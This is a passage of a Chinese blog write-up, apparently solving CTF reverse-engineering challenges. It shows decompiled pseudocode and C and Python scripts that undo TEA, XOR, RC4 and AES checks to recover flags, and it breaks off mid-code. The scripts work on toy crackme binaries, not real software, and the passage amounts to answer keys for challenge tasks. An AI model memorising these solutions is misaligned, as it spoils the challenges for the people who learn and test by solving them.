class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-28h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please Input: \n&quot;</span>);<br>  <span class="hljs-built_in">sub_140001120</span>(<span class="hljs-string">&quot;%32s&quot;</span>, byte_140004700);<br>  v5 = <span class="hljs-number">-1</span>i64;<br>  <span class="hljs-keyword">do</span><br>    ++v5;<br>  <span class="hljs-keyword">while</span> ( byte_140004700[v5] );<br>  <span class="hljs-keyword">if</span> ( v5 == dword_140004078 )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; dword_140004078; i += <span class="hljs-number">8</span> )<br>      <span class="hljs-built_in">sub_140001180</span>(&amp;byte_140004700[i], aWelcometonewst);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(byte_140004700, &amp;unk_140004080, dword_140004078) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Right! \n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入 <code>sub_140001180</code> 函数查看</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">__int64</span> __fastcall sub_140001180(unsigned int *<span class="hljs-built_in">a1</span>, _DWORD *<span class="hljs-built_in">a2</span>)<br>&#123;<br>  __int64 result<span class="hljs-comment">; // rax</span><br>  unsigned int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+0h] [rbp-38h]</span><br>  unsigned int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+4h] [rbp-34h]</span><br>  int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+8h] [rbp-30h]</span><br>  unsigned int i<span class="hljs-comment">; // [rsp+Ch] [rbp-2Ch]</span><br><br>  <span class="hljs-built_in">v3</span> = *<span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x20; ++i )</span><br>  &#123;<br>    <span class="hljs-built_in">v5</span> -= <span class="hljs-number">1640531527</span><span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v3</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">1</span>] + (<span class="hljs-built_in">v4</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v4</span>) ^ (*<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span> * <span class="hljs-built_in">v4</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v4</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">3</span>] + (<span class="hljs-built_in">v3</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v3</span>) ^ (<span class="hljs-built_in">a2</span>[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  &#125;<br>  *<span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>  result = <span class="hljs-number">4</span>i64<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">v4</span><span class="hljs-comment">;</span><br>  return result<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>看到这个加密流程就能发现是 tea 算法加密找到<code>key</code> 和输入的值直接逆</p><p><img src="https://img.dkdun.cn/v1/2024/12/22dcddbe3c87348b.png"></p><p>脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i;  <br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;                         <br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;                                              <br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x85</span>,<br><span class="hljs-number">0x59</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x07</span>, <br><span class="hljs-number">0xA8</span>,<span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[]=<span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span>*)flag;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)keys;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i+=<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//每8个字节(2个 uint32)解密</span><br>        decrypt(v+i,k);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">32</span>;j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ezencrypt"><a href="#ezencrypt" class="headerlink" title="ezencrypt"></a>ezencrypt</h1><p>先查看 <code>MainActivity</code> 函数发现有加密逻辑，<code>Enc enc = new Enc(tx)</code>，那就去 <code>Enc</code> 函数看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d292afff47f2193.png"></p><p><code>Enc</code> 的构造函数里进行第一次加密，<code>ECB</code> 模式的 <code>AES</code> 加密，密钥是 <code>MainActivity</code> 的 <code>title</code></p><p><code>doEncCheck</code> 函数进行加密数据检查，发现有 <code>native</code> 关键字，在 Java 中，<code>native </code>关键字用于声明一个方法是由本地代码（通常是C或C++）实现的，所以说明函数是 C&#x2F;C++ 编写的，所以主体在 so 文件，进行 so 提取</p><p><img src="https://img.dkdun.cn/v1/2024/12/f133efd830a5c77f.png"></p><p>IDA 打开 so 文件，找到 <code>doEncCheck</code> ，点进去查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/89a3916d618ae9df.png"></p><p><code>enc</code> 函数的加密伪代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 __fastcall enc(char *<span class="hljs-built_in">a1</span>)<br>&#123;<br>  int i<span class="hljs-comment">; // [rsp+0h] [rbp-20h]</span><br>  int v3<span class="hljs-comment">; // [rsp+4h] [rbp-1Ch]</span><br><br>  v3 = __strlen_chk(<span class="hljs-built_in">a1</span>, -<span class="hljs-number">1</span>LL);<br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; v3; ++i )</span><br>    <span class="hljs-built_in">a1</span>[i] ^= <span class="hljs-keyword">xork[i </span>% <span class="hljs-number">4</span>];<br>  return encc(<span class="hljs-keyword">xork, </span><span class="hljs-built_in">a1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>又看见一个 <code>encc</code> 加密函数，（太好了，又有个算法加密，我们有救了!）</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall encc(char *a1, char *a2)<br>&#123;<br>  unsigned __int64 v2; // rcx<br>  __int64 result; // rax<br>  unsigned __int8 v4; // [rsp+Ch] [rbp-34h]<br> <span class="hljs-built_in"> int </span>v5; // [rsp+14h] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v6; // [rsp+18h] [rbp-28h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+1Ch] [rbp-24h]<br><br>  init_sbox(a1);<br>  v5 = 0;<br>  v6 = 0;<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    v2 = __strlen_chk(a2, -1<span class="hljs-class">LL);</span><br>    result = i;<br>   <span class="hljs-built_in"> if </span>( i &gt;= v2 )<br>      break;<br>    v6 = (v6 + 1) % 256;<br>    v5 = (sbox[v6] + v5) % 256;<br>    v4 = sbox[v6];<br>    sbox[v6] = sbox[v5];<br>    sbox[v5] = v4;<br>    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % 256];<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个异或，一个 RC4 加密，找到了异或的字符串 “meow” 和要解密的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/924ab39eead959c4.png"></p><p>解密流程：RC4-&gt;异或-&gt;Base64-&gt;AES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> xork[] = <span class="hljs-string">&quot;meow&quot;</span>;<br><span class="hljs-comment">//s盒</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span>*a1)</span>&#123;<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>    sbox[i] = i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>  &#123;<br>    tmp = sbox[i];<br>    j = (a1[k] + tmp + j) % <span class="hljs-number">256</span>;<br>    sbox[i] = sbox[j];<br>    sbox[j] = tmp;<br>    <span class="hljs-keyword">if</span> ( ++k &gt;= <span class="hljs-built_in">strlen</span>(a1))<br>      k = <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 RC4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">encc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span>*data)</span>&#123;<br>  init_sbox(a1);<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(data) ; i++ )<br>  &#123;<br>    j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    k = (sbox[j] + k) % <span class="hljs-number">256</span>;<br>    tmp = sbox[j];<br>    sbox[j] = sbox[k];<br>    sbox[k] = tmp;<br>    data[i] ^= sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//异或</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">enc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<br><span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )<br>    a1[i] ^= xork[i % <span class="hljs-number">4</span>];<br>  encc(xork, a1);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> mm[]=&#123;<span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x81</span>, <br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x5D</span>&#125;;<br>  enc(mm);<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">44</span>;i++)&#123;<br>    <span class="hljs-built_in">putchar</span>(mm[i]);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>AES 密钥是&#96;&#96;MainActivity.title&#96; 也就是 “IamEzEncryptGame” ，厨子梭出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/9fbf4e8780ac5eba.png"></p><h1 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h1><p>不能 f5，有花指令，那就按下 space 键看文本流程，直接将 push-pop 的指令也就是 <code>0x4012f1~0x401302</code> 的指令全部 nop 掉 ,然后在 <code>main</code> 函数头按下 U 和 P 重新编译</p><p><img src="https://img.dkdun.cn/v1/2024/12/80a38a07ee4a66f3.png"></p><p>伪代码大概流程：输入 36 长度字符串，进入 <code>sub_401100</code> 加密，再与 <code>sub_4011D0</code> 判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v4) == <span class="hljs-number">36</span> )<br>  &#123;<br>    sub_401100(v4, <span class="hljs-number">36</span>);<br>    <span class="hljs-keyword">if</span> ( sub_4011D0(v4, <span class="hljs-number">36</span>) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong length!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>sub_401100</code> 也有花指令，和上面的一样流程来去花</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401100</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// kr00_4</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+24h] [ebp-14h] BYREF</span><br><br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;dirty_flower&quot;</span>);<br>  v2 = <span class="hljs-built_in">strlen</span>(v5);<br>  result = v2;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    result = i + a1;<br>    *(_BYTE *)(i + a1) ^= v5[i % v2];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_4011D0</code> 函数比较内容大概是：（我比较喜欢看汇编流程图，感觉比伪代码更方便 :) 嘻嘻）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ba83c2581a55c526.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0x07</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x32</span>,<br>       <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] ^= <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i % <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)])<br>    flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h1><p>ida 居然还能反编译<code>.txt</code> ，真的是 tql。第一次见这种类型的题目，看 wp 理解了半天，复现了俩小时（</p><p>记得将 <code>son.txt</code> 和 <code>father.txt</code> 放在同一目录下，打开 <code>father.txt</code>  文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-Ch] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-8h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-4h] [ebp-20h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v9; <span class="hljs-comment">// [esp+0h] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> stat_loc[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">__pid_t</span> v11; <span class="hljs-comment">// [esp+Ch] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+14h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  v9 = argv;<br>  v12 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%32s&quot;</span>, &amp;s, v4, v5, v6, v7, v8, v9);<br>  v11 = fork();<span class="hljs-comment">// 创建子进程</span><br>  <span class="hljs-keyword">if</span> ( v11 )<br>  &#123;<span class="hljs-comment">//父进程</span><br>    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      